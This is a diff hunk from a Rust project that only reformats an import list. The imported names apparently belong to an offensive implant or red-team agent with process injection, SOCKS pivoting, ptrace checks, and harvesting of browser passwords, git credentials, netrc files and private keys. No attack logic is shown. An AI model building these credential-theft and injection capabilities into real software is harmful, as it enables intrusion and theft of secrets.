@@ -20,10 +20,10 @@ use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use super::types::SocksClientState;
 
 use super::{
-    ActiveDownload, DownloadTransferState, GroupEntry, HarvestEntry,
-    INJECT_ERROR_FAILED, INJECT_WAY_EXECUTE, INJECT_WAY_INJECT, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
-    MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_WRITECOPY,
-    PendingCallback, PhantomState, PivotConnection, SessionEntry, UserEntry, capture_x11_native,
+    ActiveDownload, DownloadTransferState, GroupEntry, HarvestEntry, INJECT_ERROR_FAILED,
+    INJECT_WAY_EXECUTE, INJECT_WAY_INJECT, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE,
+    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_WRITECOPY, PendingCallback,
+    PhantomState, PivotConnection, SessionEntry, UserEntry, capture_x11_native,
     check_ptrace_permission, collect_browser_passwords, collect_git_credential_cache_from,
     collect_netrc, encode_bytes, encode_harvest_entries, encode_u32, execute, find_libc_base,
     is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
